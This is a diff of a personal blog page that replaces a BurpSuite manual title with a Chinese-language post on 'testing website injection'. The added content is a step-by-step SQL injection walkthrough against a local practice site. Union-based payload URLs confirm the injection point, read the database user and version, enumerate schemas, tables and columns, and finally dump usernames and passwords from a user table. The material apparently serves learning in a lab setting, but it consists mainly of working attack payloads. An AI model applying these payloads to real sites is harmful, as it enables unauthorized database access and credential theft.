@@ -8,7 +8,7 @@
   <meta name="description" content>
   <meta name="author" content="John Doe">
   <!-- Open Graph Data -->
-  <meta property="og:title" content="BurpSuite使用手册">
+  <meta property="og:title" content="测试网站注入">
   <meta property="og:description" content>
   <meta property="og:site_name" content="Taylor">
   <meta property="og:type" content="article">
@@ -43,7 +43,7 @@
     <div class="row">
       <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
         <div class="page-title with-background-image">
-          <p class="title">BurpSuite使用手册</p>
+          <p class="title">测试网站注入</p>
           <p class="subtitle"></p>
         </div>
         <div class="site-menu with-background-image">
@@ -99,8 +99,8 @@
           
           <!-- Date -->
           <span class="date-time info">On
-            <span class="date">2019-08-21</span>
-            <span class="time">21:40:23</span>
+            <span class="date">2019-08-31</span>
+            <span class="time">23:19:51</span>
           </span>
           
         </div>
@@ -108,7 +108,29 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          
+          <p>打开测试网站</p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzTURH.png" alt="mzTURH.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzTgJg.png" alt="mzTgJg.png"></p>
+<p>输入引号报错 加上注释不报错 所以是字符型注入</p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mz7emt.png" alt="mz7emt.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mz7g76.png" alt="mz7g76.png"></p>
+<p>用二分法测试数据库</p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzH62Q.png" alt="mzH62Q.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzHTGF.png" alt="mzHTGF.png"></p>
+<p><a href="http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,user(),3,version(),database(),6,7%20%23" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,user(),3,version(),database(),6,7%20%23</a></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzbSPO.png" alt="mzbSPO.png"></p>
+<p>[[<a href="http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3,version(),database(),6,7%20%23]" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3,version(),database(),6,7%20%23]</a>(<a href="http://127.0.0.1/news.php?id=11&#39;" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11&#39;</a> and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,version(),database(),6,7 %23)</p>
+<p>查询数据库</p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzbHFf.png" alt="mzbHFf.png"></p>
+<p>查询news表名</p>
+<p><a href="http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20%27news%27),3,version(),database(),6,7%20%23" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20%27news%27),3,version(),database(),6,7%20%23</a></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzqLAx.png" alt="mzqLAx.png"></p>
+<p>查询news表里的news字段内容</p>
+<p><a href="http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=%20%27news%27%20and%20table_name%20=%20%27news%27),3,version(),database(),6,7%20%23" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=%20%27news%27%20and%20table_name%20=%20%27news%27),3,version(),database(),6,7%20%23</a></p>
+<p><img src="https://s2.ax1x.com/2019/08/31/mzLUKJ.png" alt="mzLUKJ.png"></p>
+<p>列出所查找的内容</p>
+<p><a href="http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(user_id,%20%27`%27%20,username,%20%27`%27,%20password)%20from%20news.user),3,4,5,6,7%20%23" target="_blank" rel="noopener">http://127.0.0.1/news.php?id=11%27%20and%201=2%20union%20select%201,(select%20group_concat(user_id,%20%27`%27%20,username,%20%27`%27,%20password)%20from%20news.user),3,4,5,6,7%20%23</a></p>
+
         </div>
       </div>
     </div>
